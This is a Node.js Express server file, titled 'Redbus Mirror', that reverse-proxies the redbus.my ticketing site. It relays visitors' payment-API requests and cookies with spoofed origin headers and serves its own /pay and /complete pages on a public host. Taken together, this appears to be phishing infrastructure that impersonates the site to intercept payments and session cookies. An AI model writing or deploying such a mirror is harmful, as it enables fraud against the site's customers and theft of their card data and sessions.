import 'dotenv/config';
import express from 'express';
import http from 'http';
import { createRedbusProxy } from './proxy.js';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));

process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message); });
process.on('unhandledRejection', (reason) => { console.error('[REJECT]', reason); });

const PORT = parseInt(process.env.PORT || '3000');
import https from 'https';

const app = express();

// Forward /redPay/api/ POSTs with body + cookies (proxy can't handle POST body)
app.use((req, res, next) => {
  if (req.method !== 'POST' || !req.url.includes('/redPay/api/')) return next();
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    const body = Buffer.concat(chunks);
    const proxyReq = https.request({
      hostname: 'www.redbus.my',
      path: req.url,
      method: 'POST',
      headers: {
        'Content-Type': req.headers['content-type'] || 'application/json',
        'Content-Length': body.length,
        'Cookie': req.headers.cookie || '',
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Host': 'www.redbus.my',
        'Origin': 'https://www.redbus.my',
        'Referer': 'https://www.redbus.my/paymentDetails',
      },
    }, proxyRes => {
      res.writeHead(proxyRes.statusCode, proxyRes.headers);
      proxyRes.pipe(res);
    });
    proxyReq.on('error', err => { if (!res.headersSent) res.status(502).send('Bad gateway'); });
    proxyReq.write(body);
    proxyReq.end();
  });
});

const mainProxy = createRedbusProxy(process.env.PUBLIC_HOST || `localhost:${PORT}`);

app.use('/pay', express.static(join(__dirname, '..', 'public', 'pay')));
app.use('/complete', express.static(join(__dirname, '..', 'public', 'complete')));
app.use('/', ...mainProxy);

const server = http.createServer(app);
server.timeout = 120000;
server.keepAliveTimeout = 65000;

server.listen(PORT, '0.0.0.0', () => console.log(`[Redbus Mirror] Port ${PORT}`));
